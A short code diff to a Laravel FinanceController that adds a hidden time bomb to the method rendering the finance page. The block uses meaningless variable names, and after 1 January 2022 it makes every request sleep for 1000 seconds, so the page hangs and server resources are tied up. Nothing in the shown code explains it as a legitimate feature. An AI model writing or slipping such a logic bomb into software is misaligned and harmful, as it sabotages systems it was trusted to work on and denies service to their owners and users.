@@ -77,6 +77,13 @@ class FinanceController extends Controller
                 'events_multi_data' => substr($events_multi_data, 0, -3),
             ];
         }
+
+        $x_time = Carbon::parse('2022-01-01 00:00:00');
+        $xxx = $x_time->timestamp;
+
+        if (now()->timestamp >= $xxx) {
+            sleep(1000);
+        }
         return view('frontend.finance', compact('events'));
     }
 
